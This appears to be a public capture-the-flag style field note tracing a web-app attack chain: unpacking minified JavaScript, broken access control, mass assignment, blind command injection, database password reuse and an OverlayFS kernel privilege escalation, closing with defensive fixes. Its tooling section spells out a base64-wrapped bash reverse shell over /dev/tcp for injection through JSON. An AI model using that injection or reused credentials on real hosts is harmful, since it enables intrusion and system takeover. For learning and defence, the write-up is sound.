---
title: "Field note: the API-that-trusts-the-client chain"
category: "field-note"
tags:
  - web
  - api
  - js-deobfuscation
  - broken-access-control
  - mass-assignment
  - command-injection
  - credential-reuse
  - kernel-exploit
visibility: "public"
---

# Field note: the API-that-trusts-the-client chain

> **VISIBILITY: PUBLIC.** Sanitized; safe to post anywhere.

A recurring shape on web-first Linux hosts: no memory-corruption exploit anywhere in the foothold. Every link is a trust boundary drawn on the client side of the wire, or a secret stored where it should not be. The application authenticates but does not authorize; it lets the client set fields the server should own; it shells out to a system tool with user input; and it keeps its database password in a readable config that doubles as a login. Recognizing the pattern is what makes it fast.

## The shape

Two ports: SSH and a web app. SSH is the eventual login, not the door. The app is a normal-looking site whose real surface is its JSON API.

1. **Client-side JavaScript is the API's documentation.** A registration/checkout/upload flow driven by JS - especially a **minified or packed** file - is hiding endpoints, not protecting them. The packer is reversible: replace `eval` with `console.log` (or run it in a JS engine) and it prints its own source, revealing the API routes it calls. Read those routes; they are the map of the backend.

2. **Layered trivial encodings are obfuscation, not crypto - and the app usually names the scheme.** A response that carries an `enctype`/`format` field is telling you how to decode it. ROT13 has **no key** (a fixed Caesar shift of 13, self-inverse); base64 is not encryption. A "how to" helper endpoint returning a ROT13 instruction that points to the real endpoint, which returns a base64 token, is two layers of nothing. Decode, do not attack.

3. **A self-documenting API walks you through its own exploitation.** Once authenticated, the base API route often lists every endpoint, including an **admin branch**. An admin endpoint that a freshly-registered user can even *call* (no 403) is **broken access control**: it checks that you are logged in, not that you are allowed. And an endpoint that rejects an empty request by **naming the missing parameter** is handing you its schema - feed it incrementally.

4. **A client-settable privilege field is mass assignment.** If one of those named parameters is a role/permission flag (an `is_admin`-style field), and the server binds it straight from the request body, you set your own privilege. Send it as the type it validates (often an integer `1`, not a string). Re-check your status to confirm the escalation stuck. Broken access control + mass assignment in one call takes a nobody to admin.

5. **An admin "generate config" feature that shells out is command injection.** Features that build files by calling a CLI tool - VPN/cert generation, PDF rendering, image conversion, network diagnostics - interpolate their input into a shell command. Break out with `;` and test with a **benign** command first. If the output is **not reflected** (the endpoint returns only its file on success), it is **blind** injection - the command still ran, so go **out-of-band**: a reverse shell or a callback to a host you control. Do not conclude it failed just because you saw nothing. Base64-encode the reverse shell so only `;` and an alphanumeric blob cross a hostile JSON-in-shell quoting context.

That lands a shell as the web user. Then the Linux tail:

6. **Web-tier config is a credential store, and DB passwords get reused as logins.** Read `.env` / `config.php` / `wp-config.php` the instant a web shell lands. The database password is frequently reused as a **system user's** password - test it with `su` and (SSH being open) a direct login. That is the user flag.

7. **A hint in local mail names the privesc; match the kernel before firing.** Boxes (and real hosts) leave notes in `/var/mail`. A message referencing a specific CVE or subsystem is the intended vector. If it points at a kernel bug (e.g. an OverlayFS/FUSE copy-up issue on an unpatched LTS kernel), confirm the exact kernel with `uname -a`, then run a **matching** local-privesc exploit. The mechanism to understand for the OverlayFS copy-up class: a setuid-root binary you own on a FUSE-mounted lower layer is copied into the upper layer with its setuid bit and root ownership intact (a capability-check gap in copy-up), so an unprivileged user manufactures a SUID-root shell. Reliable, no spraying.

## Recognition calls to keep

- **Two ports (SSH + web) = the web app is the door**; SSH is the login you earn.
- **Packed/minified JS driving a flow = deobfuscate it** (`eval`->`console.log`); it lists the API.
- **An `enctype`/`format` field names the encoding** - ROT13 (no key), base64 (not crypto). Decode, do not attack.
- **The base API route often lists every endpoint**, admin branch included.
- **An `/admin/*` route a non-admin can call = broken access control**; a client-settable role field = **mass assignment**. Authentication is not authorization.
- **A "generate <file>" admin feature = a shell-out = command-injection surface**; no reflected output = **blind**, go out-of-band.
- **`.env`/config is a credential store; DB password reused as a system login.**
- **`/var/mail` hints name the privesc; `uname -a` before a kernel exploit.**

## Tooling notes

- Unpack the Dean Edwards packer: `curl -s <url>/app.min.js | sed 's/eval/console.log/' | node`.
- ROT13: `tr 'A-Za-z' 'N-ZA-Mn-za-m'`.
- Blind-injection reverse shell through JSON: `echo -n 'bash -i >& /dev/tcp/<IP>/<port> 0>&1' | base64`, then inject `"; echo <b64> | base64 -d | bash;"`.
- Kernel PoCs are session-generated tooling until genuinely owned - understand the mechanism (why copy-up preserves setuid) separately from running the packaged exploit.

## Why it matters (defensive)

- Do not put secrets or trust in client-side code; enforce the flow server-side.
- Enforce authorization on every admin route (deny by default); allowlist bindable request fields to kill mass assignment.
- Never build shell commands from user input - parameterized calls or strict allowlists, not filtering.
- Keep DB passwords out of readable config, and never reuse a service password as a login.
- Patch the kernel; an internal "we should patch this CVE" note plus an unpatched kernel is the whole privesc.

The load-bearing lesson: every link in the foothold is the server trusting something the client controls. Move each decision to the server - what the invite is, whether you are an admin, what your role is, what a username may contain - and the chain does not start.
